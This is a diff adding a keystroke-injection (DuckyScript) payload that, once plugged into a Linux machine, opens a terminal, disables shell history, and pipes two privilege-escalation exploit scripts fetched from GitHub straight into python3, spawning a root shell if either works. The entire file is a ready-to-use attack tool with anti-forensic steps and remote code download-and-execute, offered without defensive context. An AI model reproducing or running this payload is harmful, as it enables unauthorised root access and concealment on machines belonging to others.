@@ -1,0 +1,60 @@
+REM Linux LPE: CopyFail (CVE-2026-31431) + DirtyFrag
+
+DELAY 2000
+CTRL ALT t
+DELAY 500
+
+STRING export HISTFILE=/dev/null
+ENTER
+DELAY 200
+STRING unset HISTFILE
+ENTER
+DELAY 200
+
+STRING cd /dev/shm
+ENTER
+DELAY 200
+
+STRING echo "[*] Trying CopyFail (CVE-2026-31431)..."
+ENTER
+STRING curl -s https://raw.githubusercontent.com/theori-io/copy-fail-CVE-2026-31431/refs/heads/main/copy_fail_exp.py | python3
+ENTER
+DELAY 4000
+
+STRING id | grep -q root
+ENTER
+STRING if [ $? -eq 0 ]; then
+ENTER
+STRING     echo "[+] CopyFail succeeded. Enjoy root shell."
+ENTER
+STRING     exec /bin/bash --norc --noprofile
+ENTER
+STRING fi
+ENTER
+DELAY 1000
+
+STRING echo "[!] CopyFail failed. Trying DirtyFrag (CVE-2026-43284)..."
+ENTER
+STRING curl -s https://raw.githubusercontent.com/nisec-eric/dirty-frag/main/poc/dirty_frag_exp.py | python3 --verbose
+ENTER
+DELAY 4000
+
+STRING id | grep -q root
+ENTER
+STRING if [ $? -eq 0 ]; then
+ENTER
+STRING     echo "[+] DirtyFrag succeeded. Root shell ready."
+ENTER
+STRING     exec /bin/bash --norc --noprofile
+ENTER
+STRING fi
+ENTER
+
+STRING echo "[!] Both exploits failed. System may be patched."
+ENTER
+STRING echo "Try manual: sudo -l, pkexec, or check kernel version"
+ENTER
+STRING echo "uname -a; cat /etc/os-release"
+ENTER
+STRING id
+ENTER
